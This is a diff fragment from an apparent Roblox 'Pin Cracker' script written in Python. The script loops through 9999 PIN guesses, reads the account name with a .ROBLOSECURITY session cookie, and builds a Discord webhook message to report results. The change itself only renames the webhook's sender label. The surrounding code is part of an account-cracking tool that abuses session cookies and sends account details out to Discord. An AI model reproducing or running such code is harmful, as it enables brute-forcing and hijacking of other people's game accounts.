@@ -40,7 +40,7 @@ for i in range(9999):
             username = requests.get("https://users.roblox.com/v1/users/authenticated",cookies={".ROBLOSECURITY":cookie}).json()['name']
             data = {
                 "content" : ping,
-                "username" : "Lina Pin Cracker",
+                "username" : "rituals Pin Cracker",
                 "avatar_url" : "https://cdn.discordapp.com/avatars/936777152915968001/f5797f8e3ee52dcb0c5577c75b66d592.webp?size=128"
             }
             data["embeds"] = [
